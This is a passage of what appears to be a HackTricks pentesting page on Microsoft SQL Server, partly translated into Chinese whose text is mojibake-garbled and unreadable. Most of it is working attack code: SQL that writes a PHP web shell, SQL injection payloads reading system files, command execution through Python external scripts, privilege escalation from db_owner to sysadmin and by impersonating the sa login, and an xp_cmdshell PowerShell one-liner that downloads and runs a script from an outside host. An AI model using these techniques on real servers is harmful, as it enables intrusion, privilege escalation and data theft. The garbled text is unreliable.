è¦ä½¿ç”¨`MSSQL`å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦**å¯ç”¨**[**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)ï¼Œè¿™éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œç„¶åæ‰§è¡Œä¸€äº›å­˜å‚¨è¿‡ç¨‹æ¥åˆ›å»ºæ–‡ä»¶ï¼š
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **ä½¿ç”¨ OPENROWSET è¯»å–æ–‡ä»¶**

é»˜è®¤æƒ…å†µä¸‹ï¼Œ`MSSQL` å…è®¸åœ¨æ“ä½œç³»ç»Ÿä¸­å…·æœ‰è¯»å–æƒé™çš„ä»»ä½•æ–‡ä»¶ä¸Šè¿›è¡Œè¯»å–ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ SQL æŸ¥è¯¢è¯­å¥ï¼š
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
ç„¶è€Œï¼Œ**`BULK`** é€‰é¡¹éœ€è¦ **`ADMINISTER BULK OPERATIONS`** æˆ– **`ADMINISTER DATABASE BULK OPERATIONS`** æƒé™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### åŸºäºé”™è¯¯çš„SQLiæ”»å‡»å‘é‡ï¼š

This technique involves exploiting SQL injection vulnerabilities by manipulating the application to generate error messages that reveal sensitive information about the database structure or data. By injecting malicious SQL statements, an attacker can force the application to produce error messages that provide valuable insights into the underlying database.

è¿™ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œé€šè¿‡æ“çºµåº”ç”¨ç¨‹åºç”Ÿæˆé”™è¯¯æ¶ˆæ¯æ¥æ­ç¤ºæœ‰å…³æ•°æ®åº“ç»“æ„æˆ–æ•°æ®çš„æ•æ„Ÿä¿¡æ¯ã€‚é€šè¿‡æ³¨å…¥æ¶æ„çš„SQLè¯­å¥ï¼Œæ”»å‡»è€…å¯ä»¥è¿«ä½¿åº”ç”¨ç¨‹åºäº§ç”Ÿé”™è¯¯æ¶ˆæ¯ï¼Œä»è€Œæä¾›æœ‰å…³åº•å±‚æ•°æ®åº“çš„æœ‰ä»·å€¼çš„è§è§£ã€‚

The error-based vector for SQL injection can be used to extract information such as table names, column names, and even data from the database. By carefully crafting SQL statements that intentionally cause errors, an attacker can gather valuable information that can be used for further exploitation.

SQLæ³¨å…¥çš„åŸºäºé”™è¯¯çš„å‘é‡å¯ä»¥ç”¨äºæå–è¯¸å¦‚è¡¨åã€åˆ—åç”šè‡³æ•°æ®åº“ä¸­çš„æ•°æ®ç­‰ä¿¡æ¯ã€‚é€šè¿‡ç²¾å¿ƒæ„é€ æ•…æ„å¼•å‘é”™è¯¯çš„SQLè¯­å¥ï¼Œæ”»å‡»è€…å¯ä»¥æ”¶é›†æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥åˆ©ç”¨ã€‚

It is important to note that error-based SQL injection attacks can be time-consuming and may require trial and error to identify the correct syntax and exploit the vulnerability successfully. However, they can be highly effective in extracting sensitive information from a vulnerable application.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŸºäºé”™è¯¯çš„SQLæ³¨å…¥æ”»å‡»å¯èƒ½è€—æ—¶ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦åå¤å°è¯•ä»¥è¯†åˆ«æ­£ç¡®çš„è¯­æ³•å¹¶æˆåŠŸåˆ©ç”¨æ¼æ´ã€‚ç„¶è€Œï¼Œå®ƒä»¬åœ¨ä»æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­æå–æ•æ„Ÿä¿¡æ¯æ–¹é¢éå¸¸æœ‰æ•ˆã€‚

To protect against error-based SQL injection attacks, it is crucial to implement proper input validation and parameterized queries in the application code. Regular security assessments and penetration testing can also help identify and mitigate SQL injection vulnerabilities before they can be exploited by attackers.

ä¸ºäº†é˜²æ­¢åŸºäºé”™è¯¯çš„SQLæ³¨å…¥æ”»å‡»ï¼Œå…³é”®æ˜¯åœ¨åº”ç”¨ç¨‹åºä»£ç ä¸­å®æ–½é€‚å½“çš„è¾“å…¥éªŒè¯å’Œå‚æ•°åŒ–æŸ¥è¯¢ã€‚å®šæœŸè¿›è¡Œå®‰å…¨è¯„ä¼°å’Œæ¸—é€æµ‹è¯•ä¹Ÿå¯ä»¥å¸®åŠ©åœ¨æ”»å‡»è€…åˆ©ç”¨ä¹‹å‰è¯†åˆ«å’Œå‡è½»SQLæ³¨å…¥æ¼æ´ã€‚
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/è¯»å–æ–‡ä»¶æ‰§è¡Œè„šæœ¬ï¼ˆPythonå’ŒRï¼‰**

MSSQLå¯ä»¥è®©æ‚¨æ‰§è¡Œ**Pythonå’Œ/æˆ–Rè„šæœ¬**ã€‚è¿™äº›ä»£ç å°†ç”±ä¸€ä¸ª**ä¸åŒçš„ç”¨æˆ·**æ‰§è¡Œï¼Œè€Œä¸æ˜¯ä½¿ç”¨**xp\_cmdshell**æ‰§è¡Œå‘½ä»¤çš„ç”¨æˆ·ã€‚

å°è¯•æ‰§è¡Œä¸€ä¸ª**'R'** _"Hellow World!"_ **ä¸èµ·ä½œç”¨**çš„ç¤ºä¾‹ï¼š

![](<../../.gitbook/assets/image (185) (1).png>)

ä½¿ç”¨é…ç½®çš„Pythonæ‰§è¡Œå¤šä¸ªæ“ä½œçš„ç¤ºä¾‹ï¼š
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### è¯»å–æ³¨å†Œè¡¨

Microsoft SQL Serveræä¾›äº†å¤šä¸ªæ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼Œå…è®¸æ‚¨ä¸ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿç”šè‡³[Windowsæ³¨å†Œè¡¨](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)è¿›è¡Œäº¤äº’ï¼š

| **å¸¸è§„**                      | **å®ä¾‹æ„ŸçŸ¥**                           |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
è¦æŸ¥çœ‹æ›´å¤šç¤ºä¾‹ï¼Œè¯·è®¿é—®[åŸå§‹æ¥æº](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)ã€‚

### ä½¿ç”¨MSSQLç”¨æˆ·å®šä¹‰å‡½æ•°è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰- SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°åœ¨MSSQLä¸­åŠ è½½.NET dllã€‚ç„¶è€Œï¼Œè¿™éœ€è¦`dbo`è®¿é—®æƒé™ï¼Œå› æ­¤æ‚¨éœ€è¦ä½¿ç”¨`sa`æˆ–ç®¡ç†å‘˜è§’è‰²çš„æ•°æ®åº“è¿æ¥ã€‚

å•å‡»[æ­¤é“¾æ¥](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp)æŸ¥çœ‹ç¤ºä¾‹ã€‚

### å…¶ä»–RCEæ–¹æ³•

è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä¾‹å¦‚æ·»åŠ [æ‰©å±•å­˜å‚¨è¿‡ç¨‹](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server)ã€[CLRç¨‹åºé›†](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration)ã€[SQL Serverä»£ç†ä½œä¸š](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15)å’Œ[å¤–éƒ¨è„šæœ¬](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql)ã€‚

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æŸ¥æ‰¾æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MSSQLæƒé™æå‡

### ä»db\_owneråˆ°sysadmin

å¦‚æœå°†**æ™®é€šç”¨æˆ·**èµ‹äºˆ**`db_owner`**è§’è‰²ï¼Œè¯¥è§’è‰²æ‹¥æœ‰ç”±ç®¡ç†å‘˜ç”¨æˆ·ï¼ˆä¾‹å¦‚**`sa`**ï¼‰æ‹¥æœ‰çš„æ•°æ®åº“ï¼Œå¹¶ä¸”è¯¥æ•°æ®åº“é…ç½®ä¸º**`trustworthy`**ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™è¿›è¡Œæƒé™æå‡ï¼Œå› ä¸ºåœ¨å…¶ä¸­åˆ›å»ºçš„å­˜å‚¨è¿‡ç¨‹å¯ä»¥ä½œä¸ºæ‰€æœ‰è€…ï¼ˆç®¡ç†å‘˜ï¼‰æ‰§è¡Œã€‚
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
æ‚¨å¯ä»¥ä½¿ç”¨**metasploit**æ¨¡å—ï¼š
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
æˆ–è€…ä¸€ä¸ª **PS** è„šæœ¬ï¼š
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### å†’å……å…¶ä»–ç”¨æˆ·

SQL Serveræœ‰ä¸€ä¸ªç‰¹æ®Šçš„æƒé™ï¼Œåä¸º**`IMPERSONATE`**ï¼Œå®ƒå…è®¸æ‰§è¡Œç”¨æˆ·æ‰®æ¼”å¦ä¸€ä¸ªç”¨æˆ·æˆ–ç™»å½•ï¼Œç›´åˆ°ä¸Šä¸‹æ–‡è¢«é‡ç½®æˆ–ä¼šè¯ç»“æŸã€‚
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
å¦‚æœä½ èƒ½å†’å……ä¸€ä¸ªç”¨æˆ·ï¼Œå³ä½¿ä»–ä¸æ˜¯sysadminï¼Œä½ åº”è¯¥æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦æœ‰è®¿é—®å…¶ä»–æ•°æ®åº“æˆ–é“¾æ¥æœåŠ¡å™¨çš„æƒé™ã€‚
{% endhint %}

è¯·æ³¨æ„ï¼Œä¸€æ—¦ä½ æˆä¸ºsysadminï¼Œä½ å¯ä»¥å†’å……ä»»ä½•å…¶ä»–ç”¨æˆ·ï¼š
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
æ‚¨å¯ä»¥ä½¿ç”¨**metasploit**æ¨¡å—æ‰§è¡Œæ­¤æ”»å‡»ï¼š
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
æˆ–è€…ä½¿ç”¨ **PS** è„šæœ¬ï¼š
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## ä½¿ç”¨MSSQLè¿›è¡ŒæŒä¹…åŒ–

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## ä»SQL Server Linked Serversä¸­æå–å¯†ç 
æ”»å‡»è€…å¯ä»¥ä»SQLå®ä¾‹ä¸­æå–SQL Server Linked Serversçš„å¯†ç ï¼Œå¹¶ä»¥æ˜æ–‡å½¢å¼è·å–è¿™äº›å¯†ç ï¼Œä»è€Œä¸ºæ”»å‡»è€…è·å–ç”¨äºåœ¨ç›®æ ‡ä¸Šè·å¾—æ›´å¤§ç«‹è¶³ç‚¹çš„å¯†ç ã€‚
å¯ä»¥åœ¨[æ­¤å¤„](https://www.richardswinbank.net/admin/extract_linked_server_passwords)æ‰¾åˆ°æå–å’Œè§£å¯†å­˜å‚¨çš„Linked Serverså¯†ç çš„è„šæœ¬ã€‚

ä¸ºä½¿æ­¤æ¼æ´åˆ©ç”¨å·¥ä½œï¼Œéœ€è¦è¿›è¡Œä¸€äº›è¦æ±‚å’Œé…ç½®ã€‚
é¦–å…ˆï¼Œæ‚¨å¿…é¡»å…·æœ‰æœºå™¨ä¸Šçš„ç®¡ç†å‘˜æƒé™ï¼Œæˆ–è€…å…·å¤‡ç®¡ç†SQL Serveré…ç½®çš„èƒ½åŠ›ã€‚

åœ¨éªŒè¯æƒé™åï¼Œæ‚¨éœ€è¦é…ç½®ä»¥ä¸‹ä¸‰ä¸ªå†…å®¹ï¼š
1. åœ¨SQL Serverå®ä¾‹ä¸Šå¯ç”¨TCP/IPï¼›
2. æ·»åŠ ä¸€ä¸ªå¯åŠ¨å‚æ•°ï¼Œè¿™é‡Œå°†æ·»åŠ ä¸€ä¸ªè·Ÿè¸ªæ ‡å¿—ï¼Œå³-T7806ï¼›
3. å¯ç”¨è¿œç¨‹ç®¡ç†å‘˜è¿æ¥ã€‚

ä¸ºäº†è‡ªåŠ¨åŒ–è¿™äº›é…ç½®ï¼Œ[æ­¤å­˜å‚¨åº“](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/)æä¾›äº†æ‰€éœ€çš„è„šæœ¬ã€‚
é™¤äº†ä¸ºæ¯ä¸ªé…ç½®æ­¥éª¤æä¾›ä¸€ä¸ªPowerShellè„šæœ¬å¤–ï¼Œè¯¥å­˜å‚¨åº“è¿˜æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„è„šæœ¬ï¼Œå°†é…ç½®è„šæœ¬ä¸å¯†ç çš„æå–å’Œè§£å¯†ç»“åˆåœ¨ä¸€èµ·ã€‚

æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒä»¥ä¸‹é“¾æ¥ï¼š
[è§£å¯†MSSQLæ•°æ®åº“é“¾æ¥æœåŠ¡å™¨å¯†ç ](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[è§£å†³SQL Serverä¸“ç”¨ç®¡ç†å‘˜è¿æ¥çš„é—®é¢˜](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## æœ¬åœ°æƒé™æå‡

è¿è¡ŒMSSQLæœåŠ¡å™¨çš„ç”¨æˆ·å°†å¯ç”¨ç‰¹æƒä»¤ç‰Œ**SeImpersonatePrivilege**ã€‚\
æ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼ä¹‹ä¸€å‡çº§ä¸ºç®¡ç†å‘˜ï¼š

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## å‚è€ƒèµ„æ–™

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

â€‹

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## HackTricksè‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applicationsâ€”which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾— [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
